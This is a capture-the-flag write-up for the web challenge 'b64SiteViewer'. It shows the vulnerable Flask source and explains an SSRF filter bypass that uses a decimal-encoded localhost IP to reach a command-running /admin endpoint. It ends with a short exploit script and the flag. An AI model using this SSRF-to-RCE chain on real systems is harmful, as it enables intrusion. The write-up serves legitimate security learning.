+++
title = 'b64SiteViewer'
tags = [
  "Web",
  "Python",
  "Filter bypass + RCE",
  "431 points",
  "104 solves",
  "4rUN",
]
date = 2024-10-07T22:24:02+02:00
draft = true
+++

<h1 style='text-decoration: underline;text-decoration-color: #9e8c6c;font-size: 3em;'>b64SiteViewer</h1>

**Description**: This is one of the challenges added later, but despite that it wasn't very complex, in fact the most complex part wasn't even the web part, but despite that the challenge was still really nice

## Introduction

We are faced with a very simple application in which, given a url, the base64 of the page content is given back to us, plus there is a special endpoint that allows us to execute certain commands

## Source

There are two endpoints of interest to us, the first of which is this one, which, as we can see, has several filters, especially those that do not allow us to access the localhost (very strange at first glance, you might think).

```python
# filename: app.py

@app.route('/',methods=['GET','POST'])
def home():
    if request.method=='GET':
        return render_template('home.html')
    if request.method=='POST':
        try:
            url=request.form.get('url')
            scheme=urlparse(url).scheme
            hostname=urlparse(url).hostname
            blacklist_scheme=['file','gopher','php','ftp','dict','data']
            blacklist_hostname=['127.0.0.1','localhost','0.0.0.0','::1','::ffff:127.0.0.1']
            if scheme in blacklist_scheme:
                return render_template_string('blocked scheme')
            if hostname in blacklist_hostname:
                return render_template_string('blocked host')
            t=urllib.request.urlopen(url)
            content = t.read()
            output=base64.b64encode(content)
            return (f'''base64 version of the site:
                {output[:1000]}''')
        except Exception as e:
                print(e)
                return f" An error occurred: {e} - Unable to visit this site, try some other website."


```

We are blocked from accessing the localhost mainly to prevent us from accessing the admin endpoint, which, as we can clearly see, blocks all IPs that are not 127.0.0.1

```python

@app.route('/admin')
def admin():
    remote_addr = request.remote_addr

    if remote_addr in ['127.0.0.1', 'localhost']:
        cmd=request.args.get('cmd','id')
        cmd_blacklist=['REDACTED']
        if "'" in cmd or '"' in cmd:
            return render_template_string('Command blocked')
        for i in cmd_blacklist:
            if i in cmd:
                return render_template_string('Command blocked')
        print(f"Executing: {cmd}")
        res= subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return res.stdout
    else:
        return render_template_string("Don't hack me")

```

The admin endpoint also takes as parameter a CMD argument, which is a bash command that will be executed (Having first checked it with a blacklist)

## Solution

The goal is to reach /admin and execute a command to get the flag

The solution is divided into two phases

1. Bypass the filter in /
2. Bypass the blacklist in /admin (Blacklist we don't know)

### Bypass the first filter

In the endpoint, the hostname check is not really done correctly because it takes the hostname but does not check what format it is in or that it is valid etc and just does a very trivial comparison, so we just need to represent the IP with a different number system to bypass the filter.

### Bypassing the second filter

The second blacklist is much more complex, in fact initially I had many problems to understand, and especially to understand how to get the flag, as all the commands to access the ENV were blocked, but the solution as usual is much more trivial, in fact to leak the blacklist is enough to make a tail (which fortunately was not blocked) and modify the offsets with the parameters we can read part of the blacklist, Finally to get the flag is actually very simple, in fact using tail on the run. sh we can see which is the file where the environment variable of the flag is created and therefore where we can find the

### Final exploit

```python
# filename: exploit.py

#!/usr/bin/python3

import requests
import urllib.parse
import base64

BASE_URL = "https://b64siteviewer.1nf1n1ty.team/"

PAYLOAD_CMD = urllib.parse.quote("tail run???")
URL_HOOK = "http://2130706433:5000/admin?cmd=" + PAYLOAD_CMD # We use 2130706433 instead of 127.0.0.1 because is blocked by the WAF

def send_url(url):
  data = {"url": url}
  response = requests.post(BASE_URL, data=data)
  try:
    return response.text.split("base64 version of the site:")[1].strip()[2:-1], True
  except:
    return response.text, False

def main():
  print("[+] URL: ", URL_HOOK)
  res_base64,status = send_url(URL_HOOK)
  if status:
    print("[+] Result of exploit: ", base64.b64decode(res_base64).decode())
  else:
    print(f"[+] Error in the requests: {res_base64}")


if __name__ == "__main__":
  main()


# goodluck by @akiidjk

```

```stdout
$ flag: ironCTF{y0u4r3r0ck1n6k33ph4ck1n6}"
```

<p align='right'>Author: akiidjk </p>
